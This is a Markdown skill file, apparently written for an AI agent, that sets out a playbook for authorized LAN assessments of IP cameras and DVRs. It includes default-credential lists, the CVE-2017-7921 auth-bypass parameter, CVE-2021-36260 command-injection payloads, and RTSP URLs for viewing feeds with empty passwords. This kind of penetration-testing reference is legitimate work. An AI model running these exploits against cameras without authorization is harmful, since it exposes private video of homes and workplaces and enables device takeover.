---
name: ip-camera-assessment
description: >
  IP camera / DVR / NVR security assessment on a LAN for authorized reviews.
  Use when asked to scan, test, audit, or compromise IP cameras, CCTV, DVR or
  NVR systems, or when a network scan turns up camera vendors. Covers: host
  discovery via ARP-cache harvest (catches cameras that drop ICMP), device
  fingerprinting by MAC OUI and HTTP banner, XiongMai/NETSurveillance DVRIP
  exploitation (port 34567, empty-password default), Hikvision checks
  (CVE-2017-7921 auth bypass, CVE-2021-36260 /SDK/webLanguage), RTSP stream
  verification, and a localhost MJPEG dashboard. Bundles a reusable DVRIP
  client (dvrip.py). Written after the 2026-05-20 home-LAN review where 5
  XiongMai cameras were fully compromised via empty admin passwords.
---

# IP camera / DVR / NVR assessment

Playbook for authorized camera-system reviews. Cameras are high-value: they
expose video + audio of physical spaces, ship with notoriously weak defaults,
and are prime botnet (Mirai/Fbot) targets.

## Phase 1 — Host discovery (ARP beats ICMP)

Cameras frequently drop ICMP but always answer ARP. After any sweep, harvest
the ARP cache — it is the most complete live-host list:

```bash
# trigger ARP resolution for the whole /24, then read the cache
for i in $(seq 1 254); do ping -c1 -W400 -t1 192.168.1.$i >/dev/null 2>&1 & done; wait
arp -a -n | grep "on en0" | grep -v incomplete | grep -v 224.0.0
```

In the reference session the ping sweep found 24 hosts; the ARP cache had 38.

## Phase 2 — Fingerprint by MAC OUI + HTTP banner

Map MAC OUIs against `nmap-mac-prefixes`. Locally-administered MACs (2nd nibble
of 1st octet ∈ {2,6,A,E}) are randomized privacy MACs — skip them. Camera OUIs
seen: Hikvision `Hangzhou Hikvision`, XiongMai cluster `00:12:31` (shows as
"Motion Control Systems"), Imilab/Xiaomi `Shanghai Imilab`, generic `Sigmastar`.

Then grab HTTP banners — the body identifies the firmware:

- `<title>NETSurveillance WEB</title>` → **XiongMai/Sofia** firmware (the jackpot)
- `Server: webserver` + realm `IP Camera(...)` → **Hikvision** (or OEM rebrand)
- A bank of sequential IPs with sequential MACs → a multi-camera array/NVR

Camera ports to verify (rustscan misses some under load — re-probe with nmap):
`80` web, `554` RTSP, `8000` Hikvision SDK, `34567` XiongMai DVRIP, `8200`, `23`.

## Phase 3a — XiongMai / NETSurveillance (DVRIP, port 34567)

**The #1 finding: `admin` account with an empty password.** The Sofia hash of
the empty string is the constant `tlJwpbo6` — if a dumped account shows that
hash, the camera has no password.

Use the bundled `dvrip.py` (binary "Sofia" protocol client):

```bash
python3 dvrip.py 192.168.1.241 192.168.1.243   # tests default creds, dumps accounts
```

It tries `admin:""`, `admin:admin`, `admin:1234`, `default:tluafed`, then on a
`Ret:100` (success) pulls `SystemInfo`, `General`, and the account list
(msg 1472 → usernames + Sofia password hashes + authority list). Read-only:
no config writes, no reboot, no firmware ops.

Also check: `OnvifPwdCheckout.Enable=false` means ONVIF needs no password
either — a third unauthenticated access path beside DVRIP and RTSP.

## Phase 3b — Hikvision

Test a *small* set of known defaults (not a brute force) over digest auth:

```bash
for c in admin:12345 admin:123456 admin:Admin12345 admin:admin12345; do
  curl -s -o /dev/null -w "$c %{http_code}\n" --digest -u "$c" \
    "http://$IP/ISAPI/System/deviceInfo"
done
```

- **CVE-2017-7921** auth bypass: append `?auth=YWRtaW46MTEK` to ISAPI URLs
  (`/Security/users`, `/onvif-http/snapshot`, `/System/configurationData`).
- **CVE-2021-36260** RCE: `PUT /SDK/webLanguage` unauthenticated.
  Detection: a vulnerable/old box returns **200 + `<statusString>OK`**; a
  patched box returns **401**. *Confirm before claiming RCE* — send
  `<language>$(sleep 8)…</language>` (time-based) and `$(id>webLib/x)` then
  `GET /x` (file-write). If both are negative, report "endpoint exposed
  unauthenticated, RCE not confirmed" — do not over-claim. (In the reference
  session `.199` showed the 200/OK precondition but both confirmations failed.)

## Phase 4 — RTSP stream verification

Prove video access without recording private footage — metadata is enough:

```bash
# XiongMai stream URL with empty creds:
ffprobe -rtsp_transport tcp "rtsp://$IP:554/user=admin&password=&channel=1&stream=1.sdp"
# Hikvision: rtsp://USER:PASS@$IP:554/Streaming/Channels/101
```

A raw `DESCRIBE` returning `RTSP/1.0 200 OK` (vs `401`) confirms open access.
`stream=0` = main (3MP, heavy), `stream=1` = substream (D1, light — use this).

## Phase 5 — Live dashboard (optional impact demo)

Browsers can't play RTSP/H.265. Transcode H.265→MJPEG with ffmpeg and serve a
`multipart/x-mixed-replace` stream that an `<img>` tag renders. See
`workers/lan-cameras/camera_dashboard.py` for a catalog server (thumbnails via
`-frames:v 1`, click-to-stream per camera). Notes:
- `-hwaccel videotoolbox` on Apple Silicon; main 3MP runs <0.3x realtime — use
  the substream for anything live.
- Bind to `127.0.0.1` only; whitelist the in-scope IPs; kill ffmpeg on client
  disconnect (`BrokenPipeError`).

## Gotchas

- `timeout` is not on macOS by default — use ffmpeg's own `-t` flag.
- rustscan under load (many hosts × 65535 ports) silently misses ports —
  re-verify camera ports with a focused nmap pass.
- `xxd | grep 'ffd8 ff'` to count JPEG frames is unreliable (16-byte line
  alignment) — count bytes instead.
- Cloud-only cameras (Imilab/Xiaomi, some Sigmastar) expose **no** LAN TCP
  ports — no local attack surface; the risk lives in the vendor cloud.

## Remediation to report

Set strong unique passwords; enable ONVIF password check; update firmware;
**isolate cameras on their own VLAN/SSID with no inbound Internet** (the single
strongest control); consider replacing XiongMai-based gear.
